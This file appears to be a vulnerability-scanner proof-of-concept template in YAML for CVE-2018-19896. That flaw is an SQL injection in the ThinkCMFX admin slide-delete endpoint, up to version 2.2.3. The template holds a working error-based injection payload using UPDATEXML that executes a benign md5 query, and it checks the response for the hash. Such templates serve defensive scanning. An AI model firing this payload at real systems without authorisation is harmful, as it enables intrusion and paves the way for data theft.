name: poc-yaml-thinkcmf-cve-2018-19896-sqli
binding: db57116a-9284-4709-be20-3d8948c8dc92
manual: true
detail:
    author: min(minrui.zhang@chaitin.com)
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19896
        - https://github.com/thinkcmf/cmfx/issues/26
    vulnerability:
        id: CT-140183
        level: high
    ThinkCMF: ThinkCMFX <=2.2.3
    info: 后台管理员权限
transport: http
set:
    rand1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?g=Admin&m=slide&a=delete
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: ids[]=1&ids[]=0 and UPDATEXML(1, CONCAT(0x7e,(SELECT md5({{rand1}})),0x7e),1)
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
expression: r0()
